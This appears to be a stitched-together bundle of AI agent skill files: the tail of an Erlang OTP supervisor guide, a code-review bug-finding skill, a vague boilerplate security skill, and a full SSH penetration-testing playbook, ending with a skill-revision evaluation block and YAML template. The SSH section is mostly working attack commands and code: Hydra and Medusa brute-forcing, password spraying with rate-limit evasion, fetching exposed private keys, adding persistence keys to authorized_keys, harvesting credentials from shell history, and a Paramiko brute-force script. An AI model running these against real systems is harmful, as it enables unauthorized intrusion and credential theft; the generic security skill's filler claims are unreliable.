    SupFlags = #{strategy => rest_for_one},
    Children = [
        worker_spec(database),
        worker_spec(cache),  % Depends on database
        worker_spec(api)     % Depends on cache
    ],
    {ok, {SupFlags, Children}}.

worker_spec(Name) ->
    #{
        id => Name,
        start => {Name, start_link, []},
        restart => permanent,
        shutdown => 5000,
        type => worker
    }.

%%%===================================================================
%%% Nested supervisors (supervision tree)
%%%===================================================================

-module(app_supervisor).
-behaviour(supervisor).

-export([start_link/0, init/1]).

start_link() ->
    supervisor:start_link({local, ?MODULE}, ?MODULE, []).

init([]) ->
    SupFlags = #{strategy => one_for_one},

    ChildSpecs = [
        #{
            id => database_sup,
            start => {database_supervisor, start_link, []},
            restart => permanent,
            type => supervisor
        },
        #{
            id => api_sup,
            start => {api_supervisor, start_link, []},
            restart => permanent,
            type => supervisor
        },
        #{
            id => worker_sup,
            start => {worker_supervisor, start_link, []},
            restart => permanent,
            type => supervisor
        }
    ],

    {ok, {SupFlags, ChildSpecs}}.

%%%===================================================================
%%% Dynamic supervision
%%%===================================================================

-module(dynamic_sup).
-behaviour(supervisor).

-export([start_link/0, start_child/1, stop_child/1]).
-export([init/1]).

start_link() ->
    supervisor:start_link({local, ?MODULE}, ?MODULE, []).

start_child(Args) ->
    supervisor:start_child(?MODULE, [Args]).

stop_child(Pid) ->
    supervisor:terminate_child(?MODULE, Pid).

init([]) ->
    SupFlags = #{
        strategy => simple_one_for_one,
        intensity => 5,
        period => 60
    },

    ChildSpec = #{
        id => worker,
        start => {worker, start_link, []},
        restart => temporary,
        shutdown => 5000,
        type => worker
    },

    {ok, {SupFlags, [ChildSpec]}}.
```

Supervisor trees provide automatic fault recovery and system resilience.

## Best Practices

1. **Use gen_server for stateful processes** to leverage OTP infrastructure and
   error handling

2. **Implement all callback functions** even if they return default values for
   completeness

3. **Keep state records simple** to reduce complexity and improve maintainability

4. **Use handle_cast for fire-and-forget** operations without response requirements

5. **Implement proper termination** in terminate/2 for resource cleanup

6. **Set appropriate timeout values** to prevent indefinite blocking in calls

7. **Use gen_statem for complex state machines** with many states and transitions

8. **Design supervisor hierarchies** that match application component dependencies

9. **Use appropriate restart strategies** based on child process relationships

10. **Test supervisor behavior** by intentionally crashing children to verify
    recovery

## Common Pitfalls

1. **Blocking in handle_call** prevents processing other messages causing deadlock

2. **Not matching all message patterns** causes unhandled message accumulation

3. **Forgetting to reply** in handle_call leaves callers waiting indefinitely

4. **Using wrong supervision strategy** causes unnecessary process restarts

5. **Not setting process_flag trap_exit** prevents graceful termination handling

6. **Creating circular dependencies** in supervisor trees causes startup failures

7. **Using temporary restart** for critical processes allows permanent failures

8. **Not implementing code_change** prevents hot code upgrades

9. **Storing large state** in gen_server causes memory issues

10. **Not handling timeout** in state machines allows infinite blocking

## When to Use This Skill

Apply gen_server for any stateful process requiring client-server interaction.

Use gen_statem when implementing protocols or systems with explicit state
transitions.

Leverage supervisors for all applications requiring fault tolerance and automatic
recovery.

Build supervisor trees to structure complex applications with multiple components.

Use OTP behaviors for production systems requiring reliability and maintainability.

## Resources

- [Erlang OTP Design Principles](<https://www.erlang.org/doc/design_principles/users_guide.html>)
- [Gen_server Manual](<https://www.erlang.org/doc/man/gen_server.html>)
- [Gen_statem Manual](<https://www.erlang.org/doc/man/gen_statem.html>)
- [Supervisor Manual](<https://www.erlang.org/doc/man/supervisor.html>)
- [Learn You Some Erlang - OTP](<https://learnyousomeerlang.com/what-is-otp>)

## find-bugs
---
name: find-bugs
description: Find bugs, security vulnerabilities, and code quality issues in local branch changes. Use when asked to review changes, find bugs, security review, or audit code on the current branch.
---

# Find Bugs

Review changes on this branch for bugs, security vulnerabilities, and code quality issues.

## Phase 1: Complete Input Gathering

1. Get the FULL diff: `git diff master...HEAD`
2. If output is truncated, read each changed file individually until you have seen every changed line
3. List all files modified in this branch before proceeding

## Phase 2: Attack Surface Mapping

For each changed file, identify and list:

* All user inputs (request params, headers, body, URL components)
* All database queries
* All authentication/authorization checks
* All session/state operations
* All external calls
* All cryptographic operations

## Phase 3: Security Checklist (check EVERY item for EVERY file)

* [ ] **Injection**: SQL, command, template, header injection
* [ ] **XSS**: All outputs in templates properly escaped?
* [ ] **Authentication**: Auth checks on all protected operations?
* [ ] **Authorization/IDOR**: Access control verified, not just auth?
* [ ] **CSRF**: State-changing operations protected?
* [ ] **Race conditions**: TOCTOU in any read-then-write patterns?
* [ ] **Session**: Fixation, expiration, secure flags?
* [ ] **Cryptography**: Secure random, proper algorithms, no secrets in logs?
* [ ] **Information disclosure**: Error messages, logs, timing attacks?
* [ ] **DoS**: Unbounded operations, missing rate limits, resource exhaustion?
* [ ] **Business logic**: Edge cases, state machine violations, numeric overflow?

## Phase 4: Verification

For each potential issue:

* Check if it's already handled elsewhere in the changed code
* Search for existing tests covering the scenario
* Read surrounding context to verify the issue is real

## Phase 5: Pre-Conclusion Audit

Before finalizing, you MUST:

1. List every file you reviewed and confirm you read it completely
2. List every checklist item and note whether you found issues or confirmed it's clean
3. List any areas you could NOT fully verify and why
4. Only then provide your final findings

## Output Format

**Prioritize**: security vulnerabilities > bugs > code quality

**Skip**: stylistic/formatting issues

For each issue:

* **File:Line** - Brief description
* **Severity**: Critical/High/Medium/Low
* **Problem**: What's wrong
* **Evidence**: Why this is real (not already fixed, no existing test, etc.)
* **Fix**: Concrete suggestion
* **References**: OWASP, RFCs, or other standards if applicable

If you find nothing significant, say so - don't invent issues.

Do not make changes - just report findings. I'll decide what to address.

## senior-security
---
name: senior-security
description: Comprehensive security engineering skill for application security, penetration testing, security architecture, and compliance auditing. Includes security assessment tools, threat modeling, crypto implementation, and security automation. Use when designing security architecture, conducting penetration tests, implementing cryptography, or performing security audits.
---

# Senior Security

Complete toolkit for senior security with modern tools and best practices.

## Quick Start

### Main Capabilities

This skill provides three core capabilities through automated scripts:

```bash
# Script 1: Threat Modeler
python scripts/threat_modeler.py [options]

# Script 2: Security Auditor
python scripts/security_auditor.py [options]

# Script 3: Pentest Automator
python scripts/pentest_automator.py [options]
```

## Core Capabilities

### 1. Threat Modeler

Automated tool for threat modeler tasks.

**Features:**
- Automated scaffolding
- Best practices built-in
- Configurable templates
- Quality checks

**Usage:**
```bash
python scripts/threat_modeler.py <project-path> [options]
```

### 2. Security Auditor

Comprehensive analysis and optimization tool.

**Features:**
- Deep analysis
- Performance metrics
- Recommendations
- Automated fixes

**Usage:**
```bash
python scripts/security_auditor.py <target-path> [--verbose]
```

### 3. Pentest Automator

Advanced tooling for specialized tasks.

**Features:**
- Expert-level automation
- Custom configurations
- Integration ready
- Production-grade output

**Usage:**
```bash
python scripts/pentest_automator.py [arguments] [options]
```

## Reference Documentation

### Security Architecture Patterns

Comprehensive guide available in `references/security_architecture_patterns.md`:

- Detailed patterns and practices
- Code examples
- Best practices
- Anti-patterns to avoid
- Real-world scenarios

### Penetration Testing Guide

Complete workflow documentation in `references/penetration_testing_guide.md`:

- Step-by-step processes
- Optimization strategies
- Tool integrations
- Performance tuning
- Troubleshooting guide

### Cryptography Implementation

Technical reference guide in `references/cryptography_implementation.md`:

- Technology stack details
- Configuration examples
- Integration patterns
- Security considerations
- Scalability guidelines

## Tech Stack

**Languages:** TypeScript, JavaScript, Python, Go, Swift, Kotlin
**Frontend:** React, Next.js, React Native, Flutter
**Backend:** Node.js, Express, GraphQL, REST APIs
**Database:** PostgreSQL, Prisma, NeonDB, Supabase
**DevOps:** Docker, Kubernetes, Terraform, GitHub Actions, CircleCI
**Cloud:** AWS, GCP, Azure

## Development Workflow

### 1. Setup and Configuration

```bash
# Install dependencies
npm install
# or
pip install -r requirements.txt

# Configure environment
cp .env.example .env
```

### 2. Run Quality Checks

```bash
# Use the analyzer script
python scripts/security_auditor.py .

# Review recommendations
# Apply fixes
```

### 3. Implement Best Practices

Follow the patterns and practices documented in:
- `references/security_architecture_patterns.md`
- `references/penetration_testing_guide.md`
- `references/cryptography_implementation.md`

## Best Practices Summary

### Code Quality
- Follow established patterns
- Write comprehensive tests
- Document decisions
- Review regularly

### Performance
- Measure before optimizing
- Use appropriate caching
- Optimize critical paths
- Monitor in production

### Security
- Validate all inputs
- Use parameterized queries
- Implement proper authentication
- Keep dependencies updated

### Maintainability
- Write clear code
- Use consistent naming
- Add helpful comments
- Keep it simple

## Common Commands

```bash
# Development
npm run dev
npm run build
npm run test
npm run lint

# Analysis
python scripts/security_auditor.py .
python scripts/pentest_automator.py --analyze

# Deployment
docker build -t app:latest .
docker-compose up -d
kubectl apply -f k8s/
```

## Troubleshooting

### Common Issues

Check the comprehensive troubleshooting section in `references/cryptography_implementation.md`.

### Getting Help

- Review reference documentation
- Check script output messages
- Consult tech stack documentation
- Review error logs

## Resources

- Pattern Reference: `references/security_architecture_patterns.md`
- Workflow Guide: `references/penetration_testing_guide.md`
- Technical Guide: `references/cryptography_implementation.md`
- Tool Scripts: `scripts/` directory

## ssh-penetration-testing
---
name: ssh-penetration-testing
description: This skill should be used when the user asks to "pentest SSH services", "enumerate SSH configurations", "brute force SSH credentials", "exploit SSH vulnerabilities", "perform SSH tunneling", or "audit SSH security". It provides comprehensive SSH penetration testing methodologies and techniques.
---

# SSH Penetration Testing

## Purpose

Conduct comprehensive SSH security assessments including enumeration, credential attacks, vulnerability exploitation, tunneling techniques, and post-exploitation activities. This skill covers the complete methodology for testing SSH service security.

## Prerequisites

### Required Tools
- Nmap with SSH scripts
- Hydra or Medusa for brute-forcing
- ssh-audit for configuration analysis
- Metasploit Framework
- Python with Paramiko library

### Required Knowledge
- SSH protocol fundamentals
- Public/private key authentication
- Port forwarding concepts
- Linux command-line proficiency

## Outputs and Deliverables

1. **SSH Enumeration Report** - Versions, algorithms, configurations
2. **Credential Assessment** - Weak passwords, default credentials
3. **Vulnerability Assessment** - Known CVEs, misconfigurations
4. **Tunnel Documentation** - Port forwarding configurations

## Core Workflow

### Phase 1: SSH Service Discovery

Identify SSH services on target networks:

```bash
# Quick SSH port scan
nmap -p 22 192.168.1.0/24 --open

# Common alternate SSH ports
nmap -p 22,2222,22222,2200 192.168.1.100

# Full port scan for SSH
nmap -p- --open 192.168.1.100 | grep -i ssh

# Service version detection
nmap -sV -p 22 192.168.1.100
```

### Phase 2: SSH Enumeration

Gather detailed information about SSH services:

```bash
# Banner grabbing
nc 192.168.1.100 22
# Output: SSH-2.0-OpenSSH_8.4p1 Debian-5

# Telnet banner grab
telnet 192.168.1.100 22

# Nmap version detection with scripts
nmap -sV -p 22 --script ssh-hostkey 192.168.1.100

# Enumerate supported algorithms
nmap -p 22 --script ssh2-enum-algos 192.168.1.100

# Get host keys
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 192.168.1.100

# Check authentication methods
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" 192.168.1.100
```

### Phase 3: SSH Configuration Auditing

Identify weak configurations:

```bash
# ssh-audit - comprehensive SSH audit
ssh-audit 192.168.1.100

# ssh-audit with specific port
ssh-audit -p 2222 192.168.1.100

# Output includes:
# - Algorithm recommendations
# - Security vulnerabilities
# - Hardening suggestions
```

Key configuration weaknesses to identify:
- Weak key exchange algorithms (diffie-hellman-group1-sha1)
- Weak ciphers (arcfour, 3des-cbc)
- Weak MACs (hmac-md5, hmac-sha1-96)
- Deprecated protocol versions

### Phase 4: Credential Attacks

#### Brute-Force with Hydra

```bash
# Single username, password list
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Username list, single password
hydra -L users.txt -p Password123 ssh://192.168.1.100

# Username and password lists
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# With specific port
hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100

# Rate limiting evasion (slow)
hydra -l admin -P passwords.txt -t 1 -w 5 ssh://192.168.1.100

# Verbose output
hydra -l admin -P passwords.txt -vV ssh://192.168.1.100

# Exit on first success
hydra -l admin -P passwords.txt -f ssh://192.168.1.100
```

#### Brute-Force with Medusa

```bash
# Basic brute-force
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# Multiple targets
medusa -H targets.txt -u admin -P passwords.txt -M ssh

# With username list
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh

# Specific port
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -n 2222
```

#### Password Spraying

```bash
# Test common password across users
hydra -L users.txt -p Summer2024! ssh://192.168.1.100

# Multiple common passwords
for pass in "Password123" "Welcome1" "Summer2024!"; do
    hydra -L users.txt -p "$pass" ssh://192.168.1.100
done
```

### Phase 5: Key-Based Authentication Testing

Test for weak or exposed keys:

```bash
# Attempt login with found private key
ssh -i id_rsa user@192.168.1.100

# Specify key explicitly (bypass agent)
ssh -o IdentitiesOnly=yes -i id_rsa user@192.168.1.100

# Force password authentication
ssh -o PreferredAuthentications=password user@192.168.1.100

# Try common key names
for key in id_rsa id_dsa id_ecdsa id_ed25519; do
    ssh -i "$key" user@192.168.1.100
done
```

Check for exposed keys:

```bash
# Common locations for private keys
~/.ssh/id_rsa
~/.ssh/id_dsa
~/.ssh/id_ecdsa
~/.ssh/id_ed25519
/etc/ssh/ssh_host_*_key
/root/.ssh/
/home/*/.ssh/

# Web-accessible keys (check with curl/wget)
curl -s http://target.com/.ssh/id_rsa
curl -s http://target.com/id_rsa
curl -s http://target.com/backup/ssh_keys.tar.gz
```

### Phase 6: Vulnerability Exploitation

Search for known vulnerabilities:

```bash
# Search for exploits
searchsploit openssh
searchsploit openssh 7.2

# Common SSH vulnerabilities
# CVE-2018-15473 - Username enumeration
# CVE-2016-0777 - Roaming vulnerability
# CVE-2016-0778 - Buffer overflow

# Metasploit enumeration
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.100
run

# Username enumeration (CVE-2018-15473)
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/users.txt
run
```

### Phase 7: SSH Tunneling and Port Forwarding

#### Local Port Forwarding

Forward local port to remote service:

```bash
# Syntax: ssh -L <local_port>:<remote_host>:<remote_port> user@ssh_server

# Access internal web server through SSH
ssh -L 8080:192.168.1.50:80 user@192.168.1.100
# Now access http://localhost:8080

# Access internal database
ssh -L 3306:192.168.1.50:3306 user@192.168.1.100

# Multiple forwards
ssh -L 8080:192.168.1.50:80 -L 3306:192.168.1.51:3306 user@192.168.1.100
```

#### Remote Port Forwarding

Expose local service to remote network:

```bash
# Syntax: ssh -R <remote_port>:<local_host>:<local_port> user@ssh_server

# Expose local web server to remote
ssh -R 8080:localhost:80 user@192.168.1.100
# Remote can access via localhost:8080

# Reverse shell callback
ssh -R 4444:localhost:4444 user@192.168.1.100
```

#### Dynamic Port Forwarding (SOCKS Proxy)

Create SOCKS proxy for network pivoting:

```bash
# Create SOCKS proxy on local port 1080
ssh -D 1080 user@192.168.1.100

# Use with proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT -Pn 192.168.1.0/24

# Browser configuration
# Set SOCKS proxy to localhost:1080
```

#### ProxyJump (Jump Hosts)

Chain through multiple SSH servers:

```bash
# Jump through intermediate host
ssh -J user1@jump_host user2@target_host

# Multiple jumps
ssh -J user1@jump1,user2@jump2 user3@target

# With SSH config
# ~/.ssh/config
Host target
    HostName 192.168.2.50
    User admin
    ProxyJump user@192.168.1.100
```

### Phase 8: Post-Exploitation

Activities after gaining SSH access:

```bash
# Check sudo privileges
sudo -l

# Find SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Check SSH directory
ls -la ~/.ssh/
cat ~/.ssh/known_hosts
cat ~/.ssh/authorized_keys

# Add persistence (add your key)
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys

# Extract SSH configuration
cat /etc/ssh/sshd_config

# Find other users
cat /etc/passwd | grep -v nologin
ls /home/

# History for credentials
cat ~/.bash_history | grep -i ssh
cat ~/.bash_history | grep -i pass
```

### Phase 9: Custom SSH Scripts with Paramiko

Python-based SSH automation:

```python
#!/usr/bin/env python3
import paramiko
import sys

def ssh_connect(host, username, password):
    """Attempt SSH connection with credentials"""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(host, username=username, password=password, timeout=5)
        print(f"[+] Success: {username}:{password}")
        return client
    except paramiko.AuthenticationException:
        print(f"[-] Failed: {username}:{password}")
        return None
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def execute_command(client, command):
    """Execute command via SSH"""
    stdin, stdout, stderr = client.exec_command(command)
    output = stdout.read().decode()
    errors = stderr.read().decode()
    return output, errors

def ssh_brute_force(host, username, wordlist):
    """Brute-force SSH with wordlist"""
    with open(wordlist, 'r') as f:
        passwords = f.read().splitlines()

    for password in passwords:
        client = ssh_connect(host, username, password.strip())
        if client:
            # Run post-exploitation commands
            output, _ = execute_command(client, 'id; uname -a')
            print(output)
            client.close()
            return True
    return False

# Usage
if __name__ == "__main__":
    target = "192.168.1.100"
    user = "admin"

    # Single credential test
    client = ssh_connect(target, user, "password123")
    if client:
        output, _ = execute_command(client, "ls -la")
        print(output)
        client.close()
```

### Phase 10: Metasploit SSH Modules

Use Metasploit for comprehensive SSH testing:

```bash
# Start Metasploit
msfconsole

# SSH Version Scanner
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# SSH Login Brute-Force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE true
run

# SSH Key Login
use auxiliary/scanner/ssh/ssh_login_pubkey
set RHOSTS 192.168.1.100
set USERNAME admin
set KEY_FILE /path/to/id_rsa
run

# Username Enumeration
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.100
set USER_FILE users.txt
run

# Post-exploitation with SSH session
sessions -i 1
```

## Quick Reference

### SSH Enumeration Commands

| Command | Purpose |
|---------|---------|
| `nc <host> 22` | Banner grabbing |
| `ssh-audit <host>` | Configuration audit |
| `nmap --script ssh*` | SSH NSE scripts |
| `searchsploit openssh` | Find exploits |

### Brute-Force Options

| Tool | Command |
|------|---------|
| Hydra | `hydra -l user -P pass.txt ssh://host` |
| Medusa | `medusa -h host -u user -P pass.txt -M ssh` |
| Ncrack | `ncrack -p 22 --user admin -P pass.txt host` |
| Metasploit | `use auxiliary/scanner/ssh/ssh_login` |

### Port Forwarding Types

| Type | Command | Use Case |
|------|---------|----------|
| Local | `-L 8080:target:80` | Access remote services locally |
| Remote | `-R 8080:localhost:80` | Expose local services remotely |
| Dynamic | `-D 1080` | SOCKS proxy for pivoting |

### Common SSH Ports

| Port | Description |
|------|-------------|
| 22 | Default SSH |
| 2222 | Common alternate |
| 22222 | Another alternate |
| 830 | NETCONF over SSH |

## Constraints and Limitations

### Legal Considerations
- Always obtain written authorization
- Brute-forcing may violate ToS
- Document all testing activities

### Technical Limitations
- Rate limiting may block attacks
- Fail2ban or similar may ban IPs
- Key-based auth prevents password attacks
- Two-factor authentication adds complexity

### Evasion Techniques
- Use slow brute-force: `-t 1 -w 5`
- Distribute attacks across IPs
- Use timing-based enumeration carefully
- Respect lockout thresholds

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Connection Refused | Verify SSH running; check firewall; confirm port; test from different IP |
| Authentication Failures | Verify username; check password policy; key permissions (600); authorized_keys format |
| Tunnel Not Working | Check GatewayPorts/AllowTcpForwarding in sshd_config; verify firewall; use `ssh -v` |

[Evidence block]
No Skills: `40`
With Skills: `40`
Delta: `0`
Failure summary: investigate SSH protocol message vulnerability, patch Erlang source to block unauthorized execution while preserving normal SSH
Competing schema note: No prior round-0 pair evidence available.

[Output contract block]
Return YAML with fields:
revised_task_skill, change_summary{keep/add/remove/sharpen}, rationale

```yaml
revised_task_skill: |
  ...
change_summary:
  keep:
    - ...
  add:
    - ...
  remove:
    - ...
  sharpen:
    - ...
rationale: |
  ...
```
